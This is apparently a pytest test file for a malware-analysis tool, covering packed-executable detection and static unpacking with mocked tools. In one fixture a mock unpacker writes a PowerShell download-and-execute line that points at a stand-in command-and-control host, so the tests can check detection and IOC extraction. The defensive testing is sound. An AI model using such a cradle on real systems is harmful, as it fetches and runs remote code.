"""PE packer detection + static unpacking (tools mocked; nothing is executed)."""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import pytest

pytest.importorskip("pefile")

import pefile  # noqa: E402

from docutracex.parsers import pe, unpack  # noqa: E402

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))
import make_samples as ms  # noqa: E402

_UPX_PE = ms.packed_pe_exe()   # inert PE with UPX0/UPX1 sections, no code


def _pe(blob: bytes):
    return pefile.PE(data=blob, fast_load=True)


def test_heuristics_upx_by_sections() -> None:
    hits = unpack.heuristics(_UPX_PE, _pe(_UPX_PE))
    assert [h["family"] for h in hits] == ["upx"]


def test_heuristics_markers() -> None:
    base = _UPX_PE.replace(b"UPX0", b"AAAA").replace(b"UPX1", b"BBBB")
    assert unpack.heuristics(base, _pe(base)) == []
    au3 = base + b"\0" * 64 + b"AU3!EA06" + b"\0" * 64
    assert [h["family"] for h in unpack.heuristics(au3, _pe(au3))] == ["autoit"]
    inno = base + b"Inno Setup Setup Data (6.2.0)"
    assert "inno" in [h["family"] for h in unpack.heuristics(inno, _pe(inno))]
    nsis = base + b"\xef\xbe\xad\xdeNullsoftInst"
    assert "nsis" in [h["family"] for h in unpack.heuristics(nsis, _pe(nsis))]
    zsfx = base + b"PK\x03\x04" + b"\0" * 100
    assert "sfxzip" in [h["family"] for h in unpack.heuristics(zsfx, _pe(zsfx))]


def test_no_static_protector() -> None:
    blob = _UPX_PE.replace(b"UPX0", b".vmp0").replace(b"UPX1", b".vmp1")
    pe_ = _pe(blob)
    assert unpack.no_static_hits(pe_) == ["VMProtect"]
    rec = unpack.process(Path("x.exe"), blob, pe_, None, use_die=False)
    assert rec["status"] == "no_static"
    assert rec["findings"][0]["rule"] == "pe_protector"


def test_die_families_mapping() -> None:
    die = {"status": "ok", "detects": [
        {"type": "Packer", "name": "UPX", "version": "4.02", "info": "", "string": "Packer: UPX(4.02)"},
        {"type": "Protector", "name": "Themida/Winlicense", "version": "3.x", "info": "", "string": ""},
        {"type": "Compiler", "name": "Microsoft Visual C/C++", "version": "", "info": "", "string": ""},
        {"type": "Archive", "name": "ZIP", "version": "", "info": "", "string": ""},
    ]}
    fams, other = unpack.die_families(die)
    assert [f["family"] for f in fams] == ["upx", "sfxzip"]
    assert fams[0]["label"] == "UPX 4.02"
    assert other == ["Themida/Winlicense 3.x"]


def test_detect_only_without_out_dir() -> None:
    rec = unpack.process(Path("x.exe"), _UPX_PE, _pe(_UPX_PE), None, use_die=False)
    assert rec["status"] == "detected" and "UPX" in rec["detail"]


def test_upx_not_provisioned(tmp_path, monkeypatch) -> None:
    monkeypatch.setattr(unpack, "upx_exe", lambda: None)
    p = tmp_path / "s.exe"
    p.write_bytes(_UPX_PE)
    rec = unpack.process(p, _UPX_PE, _pe(_UPX_PE), tmp_path / "out", use_die=False)
    assert rec["status"] == "not_provisioned"
    assert any(f["rule"] == "pe_unpack_failed" for f in rec["findings"])


def test_upx_unpacked_and_repair_retry(tmp_path, monkeypatch) -> None:
    exe = tmp_path / "upx.exe"
    exe.write_bytes(b"MZ")
    monkeypatch.setattr(unpack, "upx_exe", lambda: exe)
    calls: list[list[str]] = []

    def fake_run(cmd, timeout, cwd=None, env=None):
        calls.append(cmd)
        if len(calls) == 1:        # first try fails (hacked header)
            return {"rc": 1, "out": "", "err": "NotPackedException", "timed_out": False,
                    "duration_s": 0.1}
        Path(cmd[cmd.index("-o") + 1]).write_bytes(b"MZunpacked")
        return {"rc": 0, "out": "", "err": "", "timed_out": False, "duration_s": 0.1}

    from docutracex import proctools
    monkeypatch.setattr(proctools, "run_bounded", fake_run)
    blob = _UPX_PE.replace(b"UPX0", b"XYZ0").replace(b"UPX1", b"XYZ1")
    blob = blob[:0x300] + b"UPX!" + blob[0x304:]   # marker only -> detected by "UPX!"
    p = tmp_path / "s.exe"
    p.write_bytes(blob)
    rec = unpack.process(p, blob, _pe(blob), tmp_path / "out", use_die=False)
    assert rec["status"] == "unpacked", rec
    assert "repaired" in rec["tool"]
    assert rec["files"][0]["name"].endswith(".unpacked.exe")
    assert rec["_files"] and Path(rec["_files"][0][0]).read_bytes() == b"MZunpacked"
    assert any(f["rule"] == "pe_unpacked" and f["severity"] == "medium" for f in rec["findings"])


def test_pe_analyze_skips_floss_capa_when_unpacked(tmp_path, monkeypatch) -> None:
    called = []
    monkeypatch.setattr(pe, "_run_floss", lambda p: called.append("floss") or {})
    monkeypatch.setattr(pe, "_run_capa", lambda p: called.append("capa") or {})

    def fake_process(path, blob, pe_, out_dir, use_die=True):
        return {"status": "unpacked", "detail": "UPX: ok", "tool": "upx -d", "detected": [],
                "files": [{"name": "a.exe", "size": 2}], "scripts": [],
                "_files": [(str(tmp_path / "a.exe"), "a.exe")], "findings": []}

    monkeypatch.setattr(unpack, "process", fake_process)
    p = tmp_path / "s.exe"
    p.write_bytes(_UPX_PE)
    r = pe.analyze(p, "s.exe", run_tools=True, unpack_dir=tmp_path / "u")
    assert called == []
    assert r["floss"]["status"] == "skipped" and "unpacked" in r["floss"]["detail"]
    assert r["_unpacked_files"] == [(str(tmp_path / "a.exe"), "a.exe")]
    assert r["unpack"]["status"] == "unpacked" and "_files" not in r["unpack"]


def _fake_upx(path, out):
    """Stand-in for upx -d: 'unpacks' a script and a PE into the output dir."""
    out.mkdir(parents=True, exist_ok=True)
    (out / "payload.ps1").write_text(
        "IEX (New-Object Net.WebClient).DownloadString('http://unpacked-c2.example/inv.ps1')\n")
    (out / "inner.exe").write_bytes(ms.packed_pe_exe().replace(b"UPX0", b".text").replace(b"UPX1", b".data"))
    return {"status": "ok", "tool": "upx -d (mock)", "detail": "unpacked", "duration_s": 0.1}


@pytest.fixture()
def _client(tmp_path, monkeypatch):
    from fastapi.testclient import TestClient

    from docutracex.app import create_app
    from docutracex.config import settings
    monkeypatch.setattr(settings, "cases_dir", tmp_path / "cases")
    (tmp_path / "cases").mkdir()
    monkeypatch.setitem(unpack._UNPACKERS, "upx", _fake_upx)
    monkeypatch.setattr(unpack, "run_die", lambda p: {"status": "not_provisioned"})
    return TestClient(create_app())


def _run(client, name, data):
    import time

    from docutracex.config import settings
    r = client.post("/api/cases", files={"file": (name, data)}).json()
    for _ in range(1200):
        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == r["task"]["id"]), {})
        if t.get("state") in ("completed", "failed"):
            break
        time.sleep(0.05)
    return settings.cases_dir / r["analysis_id"] / "results"


def _flat(nodes):
    for n in nodes:
        yield n
        yield from _flat(n.get("children") or [])


def test_unpacked_files_become_nested_children(_client) -> None:
    import json
    res = _run(_client, "sample_packed.exe", _UPX_PE)
    item = json.loads((res / "msi.json").read_text())["items"][0]
    assert item["unpack"]["status"] == "unpacked" and "_unpacked_files" not in item
    tree = json.loads((res / "nested.json").read_text())["tree"]
    kids = {n["filename"]: n for n in tree if n.get("source") == "unpack"}
    assert set(kids) == {"payload.ps1", "inner.exe"}
    assert kids["payload.ps1"]["recipe"] == ["unpack", "upx"]
    assert "ps_download" in {f["rule"] for f in kids["payload.ps1"].get("findings") or []}
    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
    assert "http://unpacked-c2.example/inv.ps1" in iocs
    # the unpacked script is not collected again as a top-level script
    ps = json.loads((res / "powershell.json").read_text()) if (res / "powershell.json").exists() else {"scripts": []}
    assert not [s for s in ps["scripts"] if not s.get("from_nested")]


def test_packed_pe_inside_an_archive_is_unpacked_too(_client) -> None:
    import io
    import json
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("factura_visor.exe", _UPX_PE)
    res = _run(_client, "factura.zip", buf.getvalue())
    nodes = list(_flat(json.loads((res / "nested.json").read_text())["tree"]))
    exe = next(n for n in nodes if n["filename"] == "factura_visor.exe")
    assert {"payload.ps1", "inner.exe"} <= {c["filename"] for c in exe.get("children") or []}
    assert next(c for c in exe["children"] if c["filename"] == "payload.ps1")["recipe"] == ["unpack", "upx"]
